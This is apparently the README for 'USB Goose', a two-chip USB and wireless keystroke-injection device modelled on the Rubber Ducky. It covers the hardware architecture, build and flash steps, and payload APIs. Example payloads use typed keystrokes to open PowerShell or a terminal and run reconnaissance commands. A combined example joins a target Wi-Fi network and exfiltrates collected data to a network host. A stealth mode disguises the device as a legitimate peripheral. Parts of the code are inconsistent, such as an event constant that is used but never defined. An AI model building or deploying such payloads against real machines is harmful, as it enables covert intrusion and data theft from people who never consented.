# USB Goose: Dual-Chip Architecture with USB 3.0 and Multi-Protocol Wireless

## Project Overview

This project leverages a powerful **dual-chip architecture** combining the **WCH CH569** (RISC-V with USB 3.0) and **ESP32-C6** (RISC-V with multi-protocol wireless) to create the most advanced USB Rubber Ducky implementation available, featuring SuperSpeed USB 3.0, comprehensive wireless capabilities, and a unified LLVM development framework.

## Architecture Overview

### Dual-Chip Design
- **WCH CH569**: RISC-V USB 3.0 controller (5 Gbps SuperSpeed)
- **ESP32-C6**: RISC-V wireless controller (Wi-Fi 6, BLE 5.0, 802.15.4)
- **High-speed SPI bridge** for inter-chip communication
- **Shared memory buffer** for coordinated operations

### Chip Responsibilities

#### WCH CH569 (USB Controller)
- **Primary USB Interface**:
  - USB 3.0 SuperSpeed HID (keyboard/mouse)
  - USB 3.0 Mass Storage emulation
  - U2F/FIDO2 security key emulation
- **Storage Management**:
  - SD card interfacing via SPI
  - Encrypted partition handling
  - High-speed data transfer
- **Payload Execution**:
  - ELF loading for USB-based payloads
  - Timing-critical operations
  - System initialization and boot sequence

#### ESP32-C6 (Wireless Controller)
- **Wireless Protocols**:
  - Wi-Fi 6 (802.11ax) with AP mode
  - Bluetooth 5.0 LE for control and proximity
  - IEEE 802.15.4 for Thread/Zigbee/Matter
- **Network Operations**:
  - Wireless reconnaissance
  - Remote payload delivery
  - Data exfiltration
  - Web configuration interface
- **Security Operations**:
  - Hardware-accelerated encryption
  - Secure key storage
  - Authentication handling

## Key Features

### ✅ SuperSpeed USB 3.0
- **5 Gbps Data Transfer**: 10x faster than USB 2.0
- **Rapid Exfiltration**: Move large datasets quickly
- **Enhanced Storage**: Function as a high-performance flash drive

### ✅ Comprehensive Wireless Capabilities
- **Wi-Fi 6**: Latest standard with improved performance
- **Bluetooth LE**: Low-energy proximity and control
- **802.15.4**: For mesh networking and IoT integration
- **Simultaneous Operation**: Run multiple protocols concurrently

### ✅ Unified LLVM Development Framework
- **Language Flexibility**: C, C++, Rust, Python, and other LLVM languages
- **Cross-Chip Framework**: Same languages for both processors
- **Shared Codebase**: Common libraries across the system
- **Modern Practices**: Use contemporary language features

### ✅ Modular Payload System
- **Multi-Vector Payloads**: Combine USB and wireless attack paths
- **Conditional Execution**: Adapt based on detected environment
- **Coordinated Operations**: Synchronized actions across chips
- **Event-Driven Architecture**: React to system and environmental triggers

### ✅ Enhanced Hardware Features
- **RGBW Status LEDs**: Visual feedback on device status
- **IR Transceiver**: Additional communication channel
- **Real-Time Clock**: Time-based operations and persistence
- **Hardware Security Elements**: Secure key storage on both chips

## Hardware Requirements

- **WCH CH569** RISC-V microcontroller (USB 3.0)
- **ESP32-C6** RISC-V wireless microcontroller
- **MicroSD Card Module** (SPI)
- **USB-C Connector** for USB 3.0 connectivity
- **Antennas** for Wi-Fi, BLE, and 802.15.4
- **RGBW LED** for status indication
- **IR Transceiver** (optional)
- **RTC Module** with battery backup
- **Push Button** for mode selection
- **Hardware Security Element** (optional)

## Software Components

### System Layer
- **Dual-Core Operating System**: Coordinated RTOS across both chips
- **Inter-Chip Communication Protocol**: Optimized for latency and throughput
- **Unified Hardware Abstraction Layer**: Consistent API across both chips

### USB Capabilities (CH569)
- **USB 3.0 SuperSpeed Stack**: Custom implementation for the CH569
- **HID Profiles**: Advanced keyboard/mouse emulation
- **Mass Storage Controller**: High-performance MSC implementation
- **U2F/FIDO2 Stack**: Security key emulation

### Wireless Capabilities (ESP32-C6)
- **ESP-IDF** with customizations for security operations
- **Multi-Protocol Manager**: Coordinate wireless interfaces
- **AP Mode Configuration**: Web-based device setup
- **Wireless Reconnaissance**: Environment scanning and analysis

### Security Features
- **Hardware-Accelerated Encryption**: AES-256, SHA-256
- **Secure Key Management**: Protected storage
- **Encrypted Payloads**: Obfuscated operation
- **Anti-Tampering Measures**: Detect physical interference

## Code Structure

```
/firmware
 ├── common/                   # Shared code between chips
 │   ├── payload_framework.h   # Core framework API
 │   ├── payload_framework.c   # Framework implementation
 │   ├── protocol.h            # Inter-chip communication protocol
 │   ├── protocol.c            # Protocol implementation
 │   ├── security.h            # Shared security primitives
 │   ├── security.c            # Security implementation
 │   ├── tests/                # Unit tests for common code
 │   ├── cmake/                # Common CMake modules
 │   └── CMakeLists.txt        # Build config for common module
 │
 ├── ch569/                    # WCH CH569 USB controller code
 │   ├── main.c                # Main firmware for CH569
 │   ├── startup.c             # Startup code
 │   ├── system_ch569.c        # System initialization
 │   ├── ch569_hid.h           # HID interface
 │   ├── ch569_hid.c           # HID implementation
 │   ├── ch569_os_detect.h     # OS detection interface
 │   ├── ch569_os_detect.c     # OS detection implementation
 │   ├── config/               # Configuration files
 │   ├── usb/                  # USB functionality
 │   │   ├── usb_core.c        # USB 2.0 functionality 
 │   │   ├── usb3_core.c       # USB 3.0 core functionality
 │   │   ├── usb_descriptors.h # USB descriptors
 │   │   ├── hid.c             # Keyboard + Mouse
 │   │   ├── msc.c             # Mass Storage
 │   │   └── u2f.c             # U2F/FIDO2 implementation
 │   ├── storage/
 │   │   ├── sd_card.c         # SD card interface
 │   │   └── encryption.c      # Storage encryption
 │   ├── payload/
 │   │   ├── loader.c          # ELF loader
 │   │   └── executor.c        # Payload execution environment
 │   ├── comm/
 │   │   └── spi_slave.c       # SPI communication with ESP32
 │   ├── hardware/
 │   │   ├── leds.c            # LED control
 │   │   └── rtc.c             # Real-time clock functions
 │   ├── vendor/               # CH569 vendor-specific code
 │   │   └── ch569/
 │   │       ├── ch569_usb.h   # Vendor USB headers
 │   │       ├── ch569_gpio.h  # GPIO headers
 │   │       ├── peripheral/   # Peripheral drivers
 │   ├── ch569_link.ld         # Linker script
 │   ├── ch569_payload.ld      # Payload linker script
 │   └── CMakeLists.txt        # Build config for CH569
 │
 ├── esp32c6/                  # ESP32-C6 wireless controller code
 │   ├── main.c                # Main firmware for ESP32-C6
 │   ├── esp32c6_os_detect.h   # OS detection interface
 │   ├── esp32c6_os_detect.c   # OS detection implementation
 │   ├── config/               # Configuration files
 │   ├── wireless/
 │   │   ├── wifi.h            # Wi-Fi interface
 │   │   ├── wifi.c            # Wi-Fi functionality
 │   │   ├── ble.h             # BLE interface
 │   │   ├── ble.c             # Bluetooth LE stack
 │   │   ├── thread.h          # Thread interface
 │   │   └── thread.c          # 802.15.4/Thread implementation
 │   ├── comm/
 │   │   ├── spi_master.h      # SPI interface
 │   │   └── spi_master.c      # SPI communication with CH569
 │   ├── web/
 │   │   ├── server.c          # Web configuration server
 │   │   └── api.c             # RESTful API for configuration
 │   ├── recon/
 │   │   ├── scanner.c         # Network reconnaissance
 │   │   └── analyzer.c        # Target analysis
 │   ├── security/
 │   │   ├── crypto.c          # Cryptographic operations
 │   │   └── secure_storage.c  # Protected key storage
 │   ├── sdkconfig.defaults    # ESP-IDF configuration
 │   ├── esp32c6_payload.ld    # Payload linker script
 │   └── CMakeLists.txt        # Build config for ESP32-C6
 │
 ├── examples/                 # Example payloads
 │   ├── usb_payloads/         # USB-focused payloads
 │   │   └── os_detect_basic.c # C example
 │   ├── wireless_payloads/    # Wireless-focused payloads
 │   │   └── wifi_recon.rs     # Rust example
 │   ├── combined_payloads/    # Multi-vector payloads
 │   │   └── exfiltration.cpp  # C++ example
 │   ├── python_payloads/      # Python payloads
 │   │   └── os_detect.py      # Python example
 │   └── CMakeLists.txt        # Build config for examples
 │
 ├── tools/                    # Development tools
 │   ├── payload_builder/      # Visual payload builder (Qt)
 │   │   ├── main.cpp
 │   │   ├── mainwindow.cpp
 │   │   ├── mainwindow.h
 │   │   └── ui/               # UI files
 │   ├── simulator/            # Payload simulator
 │   │   ├── main.cpp
 │   │   ├── usb_sim.cpp
 │   │   └── wireless_sim.cpp
 │   ├── pythran/              # Python-to-C compiler tools
 │   │   ├── compile.py        # Pythran compiler wrapper
 │   │   ├── bindings.cpp      # C bindings for Python
 │   │   └── templates/        # Code templates
 │   ├── flashers/             # Programming utilities
 │   │   ├── wch-flasher.py    # CH569 flasher
 │   │   ├── dual_flasher.cpp  # Combined flasher
 │   │   └── serial_port.cpp   # Serial port utilities
 │   └── CMakeLists.txt        # Build config for tools
 │
 ├── docs/                     # Documentation
 │   ├── api/                  # API reference
 │   ├── hardware/             # Hardware design docs
 │   └── tutorials/            # Tutorials and guides
 │
 ├── cmake/                    # CMake modules
 │   ├── ch569_toolchain.cmake # CH569-specific toolchain
 │   └── esp32c6_toolchain.cmake # ESP32-C6-specific toolchain
 │
 ├── build.sh                  # Build script helper
 ├── CMakeLists.txt            # Top-level CMake file
 └── README.md                 # Project documentation
```

## Unified LLVM Development

### Building Payloads
All payloads can be built using standard LLVM tools:

```sh
# For CH569 (USB controller)
clang -target riscv32-unknown-none-elf -mcpu=rv32imac -O2 \
    -I../common -o usb_payload.elf usb_payload.c

# For ESP32-C6 (Wireless controller)
clang -target riscv32-unknown-none-elf -mcpu=rv32imac -O2 \
    -I../common -o wireless_payload.elf wireless_payload.c
```

### Multi-Vector Payload Example

```cpp
// shared_definitions.h - Used by both chips
#pragma once

enum PayloadTriggers {
  TRIGGER_USB_CONNECTED,
  TRIGGER_WIFI_TARGET_FOUND,
  TRIGGER_BLUETOOTH_PROXIMITY,
  TRIGGER_TIME_ELAPSED
};

struct PayloadContext {
  uint8_t target_os;
  uint8_t security_level;
  uint32_t capabilities;
  char hostname[32];
};

// USB Payload for CH569 (usb_component.c)
#include "payload_framework.h"
#include "shared_definitions.h"

PAYLOAD_INFO("USB Keystrokes", "1.0", PAYLOAD_PRIORITY_HIGH);

void payload_main(PayloadContext* ctx) {
  // Check target OS from context
  if (ctx->target_os == OS_WINDOWS) {
    // Send Windows-specific keystrokes
    Keyboard::sendWinKey('r');
    Keyboard::sendString("powershell");
    Keyboard::sendKey(KEY_RETURN);
    
    // Signal wireless component to start its part
    InterChip::triggerEvent(TRIGGER_USB_STAGE_COMPLETE);
  }
}

// Wireless Payload for ESP32-C6 (wireless_component.c)
#include "payload_framework.h"
#include "shared_definitions.h"

PAYLOAD_INFO("Wireless Exfiltration", "1.0", PAYLOAD_PRIORITY_NORMAL);

void payload_main(PayloadContext* ctx) {
  // Wait for signal from USB component
  InterChip::waitForEvent(TRIGGER_USB_STAGE_COMPLETE);
  
  // Start wireless reconnaissance
  WiFi::scanNetworks();
  
  // Establish connection and exfiltrate data
  if (WiFi::connect("target_network", "password")) {
    Exfiltration::sendData("192.168.1.100", 8080, CollectedData::getBuffer());
  }
}
```

## Python Payload Support

The project supports writing payloads in Python through Pythran, a Python-to-C++ compiler that leverages LLVM. This allows you to write your payload logic in high-level Python code, which is then compiled to native code for optimal performance on the device.

### Python Payload Example

```python
# os_detect.py - Python payload for OS detection
#pythran export payload_main(int*, str*, str*)

# These constants match the C API
OS_UNKNOWN = 0
OS_WINDOWS = 1
OS_MACOS = 2
OS_LINUX = 3
OS_CHROMEOS = 4

# Key codes
KEY_R = 0x15
KEY_RETURN = 0x28
KEY_SPACE = 0x2C
KEY_T = 0x17

# Modifiers
MOD_LCTRL = 0x01
MOD_LALT = 0x04
MOD_LMETA = 0x08 # Windows/Command key

def payload_main(context):
    # Set LED to yellow during detection
    led_set_color(255, 255, 0, 0)
    
    # Get detected OS from context
    detected_os = context["detected_os"]
    
    # Log detection confidence
    log_message(f"OS Detection confidence: {os_get_confidence()}%")
    
    # Different actions based on detected OS
    if detected_os == OS_WINDOWS:
        led_set_color(0, 0, 255, 0)  # Blue
        log_message("Windows detected - opening PowerShell")
        
        # Send Win+R to open Run dialog
        keyboard_tap_with_modifiers(KEY_R, MOD_LMETA)
        system_delay(500)
        
        # Type PowerShell and press Enter
        keyboard_send_string("powershell")
        keyboard_tap(KEY_RETURN)
        system_delay(1000)
        
        # Execute a simple command
        keyboard_send_line("Get-ComputerInfo | Select-Object OsName, OsVersion")
    
    elif detected_os == OS_MACOS:
        led_set_color(0, 255, 0, 0)  # Green
        log_message("macOS detected - opening Terminal")
        
        # Open Terminal with keyboard shortcut
        keyboard_tap_with_modifiers(KEY_SPACE, MOD_LMETA)
        system_delay(300)
        keyboard_send_string("terminal")
        system_delay(300)
        keyboard_tap(KEY_RETURN)
        system_delay(1000)
        
        # Execute a simple command
        keyboard_send_line("sw_vers")
    
    elif detected_os == OS_LINUX:
        led_set_color(255, 0, 0, 0)  # Red
        log_message("Linux detected - opening Terminal")
        
        # Open Terminal with keyboard shortcut (varies by distro)
        keyboard_tap_with_modifiers(KEY_T, MOD_LCTRL | MOD_LALT)
        system_delay(1000)
        
        # Execute a simple command
        keyboard_send_line("uname -a && cat /etc/os-release")
    
    else:
        led_set_color(255, 0, 255, 0)  # Purple
        log_message("Unknown OS or detection failed")
    
    # Wait 5 seconds before completing
    system_delay(5000)
    led_off()
    return 0
```

### Compiling Python Payloads

Python payloads are compiled using our LLVM toolchain:

```sh
# Compile a Python payload
./tools/pythran/compile.py examples/python_payloads/os_detect.py --target ch569

# This will:
# 1. Use Pythran to compile the Python to C++
# 2. Use Clang to compile the C++ to LLVM IR
# 3. Link with the C API bindings
# 4. Generate an ELF file compatible with the target chip
```

### Python API Bindings

Our framework provides Python bindings to all core functionality:

```python
# Available Python API functions (map 1:1 to C functions)

# Keyboard operations
keyboard_press(key)
keyboard_release(key)
keyboard_tap(key)
keyboard_press_modifier(modifiers)
keyboard_release_modifier(modifiers)
keyboard_tap_with_modifiers(key, modifiers)
keyboard_send_string(text)
keyboard_send_line(text)

# LED control
led_set_color(r, g, b, w)
led_set_pattern(pattern)
led_set_brightness(brightness)
led_off()

# System functions
system_delay(ms)
system_log(message)
system_is_usb_controller()
system_is_wireless_controller()

# OS detection
os_detect(flags)
os_get_hostname()
os_get_username()
os_get_confidence()

# Inter-chip communication
interchip_trigger_event(event, data)
interchip_wait_for_event(event, timeout_ms)
interchip_send_data(channel, data)
```

### Python Payload Limitations

The Pythran compiler supports most Python features needed for payloads:

- ✅ Full support for control flow (if/for/while)
- ✅ Functions and basic containers (lists, dicts)
- ✅ String manipulation
- ✅ Integer and floating-point operations
- ✅ Integration with C API

Unsupported features (generally not needed for payloads):
- ❌ Dynamic code execution (eval/exec)
- ❌ Complex class hierarchies and metaclasses
- ❌ Dynamic imports
- ❌ Some standard library modules

## Operation Modes

1. **Standard Mode**:
   - Functions as USB HID + Mass Storage
   - Wireless interfaces in passive monitoring
   
2. **Admin Mode** (triggered by button press):
   - Exposes configuration interface via Wi-Fi AP
   - Shows hidden partitions and payload directory
   
3. **Stealth Mode**:
   - Minimal LED activity
   - Covert wireless operation
   - Appears as legitimate USB device

## Build and Flash Instructions

```sh
# Clone repository
git clone https://github.com/yourusername/advanced-rubber-ducky.git
cd advanced-rubber-ducky

# Build firmware for both chips
mkdir build && cd build
cmake ..
make

# Flash CH569
wch-flasher -p /dev/ttyUSB0 -f ch569_firmware.bin

# Flash ESP32-C6
esptool.py --chip esp32c6 --port /dev/ttyUSB1 write_flash 0x0 esp32c6_firmware.bin
```

## Nim Payload Support

The project also supports writing payloads in Nim, a statically typed language with Python-like syntax that compiles to C. Nim provides the readability of Python with the performance of compiled languages, making it excellent for embedded development.

### Nim Payload Example

```nim
# os_detect.nim - Nim payload for OS detection
#
# This example demonstrates using Nim for USB Goose payloads
# Nim provides Python-like syntax with static typing and
# compile-time features, ideal for embedded development.

# C bindings to the payload framework
{.passC: "-I../../firmware/common/include".}
{.compile: "../../tools/nim/bindings.c".}

# OS detection constants
const
  OS_UNKNOWN* = 0
  OS_WINDOWS* = 1
  OS_MACOS* = 2
  OS_LINUX* = 3

# Key codes
const
  KEY_R* = 0x15
  KEY_RETURN* = 0x28
  KEY_SPACE* = 0x2C
  KEY_T* = 0x17

# Modifier keys
const
  MOD_LCTRL* = 0x01
  MOD_LALT* = 0x04
  MOD_LMETA* = 0x08  # Windows/Command key

# PayloadContext structure
type
  PayloadContext* = object
    detected_os*: int
    security_level*: int
    target_capabilities*: uint32
    hostname*: array[32, char]
    username*: array[32, char]
    timestamp*: uint64
    reserved*: array[32, uint8]

# Import framework functions
proc led_set_color*(r, g, b, w: cint) {.importc.}
proc led_off*() {.importc.}
proc keyboard_tap_with_modifiers*(key: cint, modifiers: cint) {.importc.}
proc keyboard_send_string*(text: cstring) {.importc.}
proc keyboard_tap*(key: cint) {.importc.}
proc keyboard_send_line*(text: cstring) {.importc.}
proc system_delay*(ms: cint) {.importc.}
proc log_message*(message: cstring) {.importc.}

# Main payload function - exported for C calling
proc payload_main*(ctx: ptr PayloadContext): int {.exportc.} =
  # Set LED to yellow during initialization
  led_set_color(255, 255, 0, 0)
  
  # Get current OS from context
  let detectedOs = ctx.detected_os
  
  # Different actions based on detected OS
  case detectedOs:
    of OS_WINDOWS:
      led_set_color(0, 0, 255, 0)  # Blue for Windows
      log_message("Windows detected - opening PowerShell")
      
      # Open Run dialog with Win+R
      keyboard_tap_with_modifiers(KEY_R, MOD_LMETA)
      system_delay(500)
      
      # Type PowerShell and press Enter
      keyboard_send_string("powershell")
      keyboard_tap(KEY_RETURN)
      system_delay(1000)
      
      # Execute commands
      keyboard_send_line("Get-ComputerInfo | Select-Object OsName, OsVersion")
  
  # Wait 5 seconds before completing
  system_delay(5000)
  led_off()
  return 0
```

### Compiling Nim Payloads

Nim payloads are compiled using our LLVM toolchain:

```sh
# Compile a Nim payload
./tools/nim/compile.py examples/nim_payloads/os_detect.nim --target ch569

# This will:
# 1. Use Nim to compile the Nim code to C
# 2. Use Clang to compile the C to LLVM IR
# 3. Link with the C API bindings
# 4. Generate an ELF file compatible with the target chip
```

### Nim Advantages

1. **Static typing with type inference** - Catch errors at compile time while maintaining clean syntax
2. **Memory safety features** - Prevents many common bugs
3. **Compiled performance** - Native code execution speed
4. **Python-like syntax** - Easy to read and write
5. **Powerful metaprogramming** - Compile-time code generation and optimization
6. **Low-level control** - Direct memory access when needed
7. **Small output binaries** - Efficient for embedded platforms

### Nim API Bindings

The framework provides Nim bindings to all core functionality with the same function names as our C API:

```nim
# Available Nim API functions

# Keyboard operations
proc keyboard_press*(key: cint) {.importc.}
proc keyboard_release*(key: cint) {.importc.}
proc keyboard_tap*(key: cint) {.importc.}
proc keyboard_press_modifier*(modifiers: cint) {.importc.}
proc keyboard_release_modifier*(modifiers: cint) {.importc.}
proc keyboard_tap_with_modifiers*(key: cint, modifiers: cint) {.importc.}
proc keyboard_send_string*(text: cstring) {.importc.}
proc keyboard_send_line*(text: cstring) {.importc.}

# LED control
proc led_set_color*(r, g, b, w: cint) {.importc.}
proc led_set_pattern*(pattern: cint) {.importc.}
proc led_set_brightness*(brightness: cint) {.importc.}
proc led_off*() {.importc.}

# System functions
proc system_delay*(ms: cint) {.importc.}
proc log_message*(message: cstring) {.importc.}
proc system_is_usb_controller*(): bool {.importc.}
proc system_is_wireless_controller*(): bool {.importc.}

# OS detection
proc os_detect*(flags: cint): cint {.importc.}
proc os_get_hostname*(buffer: cstring, max_len: cint): bool {.importc.}
proc os_get_username*(buffer: cstring, max_len: cint): bool {.importc.}
proc os_get_confidence*(): cint {.importc.}

# Inter-chip communication
proc interchip_trigger_event*(event: cint, data: pointer, data_len: cint): bool {.importc.}
proc interchip_wait_for_event*(event: cint, timeout_ms: cint): bool {.importc.}
proc interchip_send_data*(channel: cint, data: pointer, data_len: cint): bool {.importc.}
```

## Future Enhancements

- **AI-powered targeting** using ESP32's ML capabilities
- **Physical penetration** hardware extensions